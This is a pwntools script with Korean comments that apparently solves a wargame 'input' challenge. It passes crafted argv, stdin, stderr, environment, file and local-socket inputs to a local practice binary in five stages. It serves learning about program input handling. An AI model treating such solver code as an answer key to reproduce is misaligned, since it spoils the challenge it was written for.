from pwn import *
 
#stage1
argvs = [str(i) for i in range(100)]
argvs[ord('A')] = '\x00'
argvs[ord('B')] = '\x20\x0a\x0d'
 
#stage2
with open('./stderr', 'a') as f:
    f.write('\x00\x0a\x02\xff')
#stage3
envVal = {'\xde\xad\xbe\xef':'\xca\xfe\xba\xbe'}
 
#stage4
with open('./\x0a', 'a') as f:
    f.write('\x00\x00\x00\x00')
 
#stage5 
argvs[ord('C')] = '40000'
 
#인자전달, stderr 파일 열기, 환경변수 설정등
target = process(executable='/home/input2/input', argv=argvs, stderr=open('./stderr'), env=envVal)
 
#stage2의 stdin
target.sendline('\x00\x0a\x00\xff')
 
#다시 stage5, 포트가 argv['C']와 일치해야겠죠?
conn = remote('localhost', 40000)
conn.send('\xde\xad\xbe\xef')
target.interactive()  

